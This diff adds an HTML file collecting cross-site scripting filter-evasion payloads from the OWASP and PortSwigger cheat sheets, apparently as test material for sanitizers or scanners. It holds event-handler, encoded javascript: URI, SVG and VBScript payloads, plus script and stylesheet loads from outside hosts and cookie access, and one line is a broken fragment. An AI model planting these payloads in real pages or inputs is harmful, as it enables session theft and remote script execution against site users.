@@ -1,0 +1,69 @@
+<!-- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html -->
+<html>
+  <head>
+    <script SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></script>
+    <style>@import'http://xss.rocks/xss.css';</style>
+  </head>
+  <body onload=alert('XSS') style="background:javascript:alert('XSS')">
+    <a onmouseover="alert(document.cookie)"\>xxs link\</a>
+    <a onmouseover=alert(document.cookie)\>xxs link\</a>
+    <img """><script>alert("XSS")</script>">
+    <a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
+    <img SRC=# onmouseover="alert('xxs')">
+    <img onmouseover="alert('xxs')">
+      <img SRC=/ onerror="alert(String.fromCharCode(88,83,83))">
+    <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+
+    <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
+    000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
+    <a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
+    <a href="jav   ascript:alert('XSS');">Click Me</a>
+    <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
+    <a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
+    <a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
+    <a href=" &#14;  javascript:alert('XSS');">Click Me</a>
+    <<script>alert("XSS");//\<</script>
+    <script src=//xss.rocks/.j></script>
+    <input type="IMAGE" src="javascript:alert('XSS');">
+    <img dnysec="javascript:alert('XSS')">
+    <img lowsec="javascript:alert('XSS')">
+    <img src="vbscript:msgbox("XSS")">
+    <svg onload=alert('XSS')>
+      <br size="&{alert('XSS')}">
+      <link rel="stylesheet" href="javascript:alert('XSS');">
+      <link rel="stylesheet" href="http://xss.rocks/xss.css">
+      <!-- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet -->
+      <x onafterscriptexecute=alert(1)><script>1</script>
+      <x onbeforescriptexecute=alert(1)><script>1</script>    
+      <svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x />
+      <svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>
+      <svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>
+      <svg onload="throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}"></svg>
+      <script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>
+      <script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>
+      <embed src="#!alert(1)" codebase=javascript:>
+      <embed src="#alert(1)" codebase=javascript://>
+      <object data="#!alert(1)" codebase=javascript:>
+      <base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>
+      <svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /></svg>
+      <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>
+      <script>location.protocol='javascript'</script>
+      <input type=image onloadend=alert(1) src=validimage.png>
+      <img src=validimage.png onloadstart=alert(1)>
+      <svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /></svg>
+      <svg><discard onbegin=alert(1)></discard></svg>
+      <!-- ><img title="--><iframe/onload=alert(1)>"> -->
+      <!-- ><img title="--><iframe/onload=alert(1)>"> -->
+      <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>">
+      <form><button name=x formaction=x><b>stealme</b></button></form>
+      <iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@></iframe>
+      <iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@></iframe>
+      
+
+
+
+
+
+  </body>
+</html>
+
